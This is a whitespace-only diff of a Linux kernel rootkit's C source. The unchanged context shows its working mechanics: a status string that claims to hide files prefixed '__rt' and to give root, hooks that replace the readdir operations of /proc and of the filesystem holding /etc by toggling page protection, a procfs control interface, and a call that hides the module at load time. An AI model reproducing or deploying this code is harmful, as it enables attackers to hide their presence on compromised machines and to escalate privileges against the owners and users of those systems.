@@ -113,8 +113,8 @@ static int fs_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
 static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
 {
 	int size;
-	
-	sprintf(module_status, 
+
+	sprintf(module_status,
 "RTKIT\n\
 DESC:\n\
   hides files prefixed with __rt or 10-__rt and gives root\n\
@@ -133,13 +133,13 @@ STATUS\n\
 	size = strlen(module_status);
 
 	if (off >= size) return 0;
-  
+
 	if (count >= size-off) {
 		memcpy(buffer, module_status+off, size-off);
 	} else {
 		memcpy(buffer, module_status+off, count);
 	}
-  
+
 	return size-off;
 }
 
@@ -161,7 +161,7 @@ static int rtkit_write(struct file *file, const char __user *buff, unsigned long
 	} else if (!strncmp(buff, "ms", MIN(2, count))) {//module hide
 		module_show();
 	}
-	
+
         return count;
 }
 
@@ -178,7 +178,7 @@ static void procfs_clean(void)
 		set_addr_ro(proc_fops);
 	}
 }
-	
+
 static void fs_clean(void)
 {
 	if (fs_fops != NULL && fs_readdir_orig != NULL) {
@@ -199,33 +199,32 @@ static int __init procfs_init(void)
 	}
 	proc_rtkit->read_proc = rtkit_read;
 	proc_rtkit->write_proc = rtkit_write;
-	
+
 	//substitute proc readdir to our wersion (using page mode change)
 	proc_fops = ((struct file_operations *) proc_root->proc_fops);
 	proc_readdir_orig = proc_fops->readdir;
 	set_addr_rw(proc_fops);
 	proc_fops->readdir = proc_readdir_new;
 	set_addr_ro(proc_fops);
-	
+
 	return 1;
 }
 
 static int __init fs_init(void)
 {
 	struct file *etc_filp;
-	
+
 	//get file_operations of /etc
 	etc_filp = filp_open("/etc", O_RDONLY, 0);
 	if (etc_filp == NULL) return 0;
 	fs_fops = (struct file_operations *) etc_filp->f_op;
 	filp_close(etc_filp, NULL);
-	
+
 	//substitute readdir of fs on which /etc is
 	fs_readdir_orig = fs_fops->readdir;
 	set_addr_rw(fs_fops);
 	fs_fops->readdir = fs_readdir_new;
 	set_addr_ro(fs_fops);
-	
 	return 1;
 }
 
@@ -239,7 +238,7 @@ static int __init rootkit_init(void)
 		return 1;
 	}
 	module_hide();
-	
+
 	return 0;
 }
 
